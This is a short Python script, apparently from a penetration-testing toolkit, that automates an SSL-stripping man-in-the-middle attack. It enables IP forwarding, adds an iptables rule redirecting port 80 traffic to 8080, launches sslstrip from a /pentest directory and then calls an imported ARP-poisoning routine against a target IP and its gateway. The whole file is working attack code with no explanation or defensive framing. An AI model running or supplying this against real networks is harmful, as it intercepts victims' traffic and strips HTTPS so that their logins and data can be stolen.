from arp_mitm import *
from subprocess import *
import time

def config():
# Sets Up IP Forwarding
# echo 1 > /proc/sys/net/ipv4/ip_forward
	print 'Setting Up IP Forwarding...'
	forwarding = ['echo', '1']
	forwarding_fd = os.open('/proc/sys/net/ipv4/ip_forward',os.O_WRONLY)
	forwardingprocess = Popen(forwarding,stdout=forwarding_fd)
	forwardingprocess.communicate()
	os.close(forwarding_fd)

# Sets up IP Tables to work in conjunction with sslstrip
# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
	print 'Setting Up IPTables...'
	iptables = ['iptables','-t','nat','-A','PREROUTING','-p','tcp', 
							'--destination-port','80','-j','REDIRECT','--to-port','8080']
	iptablesprocess = Popen(iptables)
	iptablesprocess.communicate()

def sslstrip(gatewayIP,gatewayMAC,targetIP,targetMAC):
# Runs an sslstrip attack
	config()
	command = ['python','sslstrip.py','-l','8080','-f','-k']
	sslstripdirectory = '/pentest/web/sslstrip/'
	sslstripprocess = Popen(command,cwd=sslstripdirectory)
	time.sleep(2)
	mitm(gatewayIP,gatewayMAC,targetIP,targetMAC)
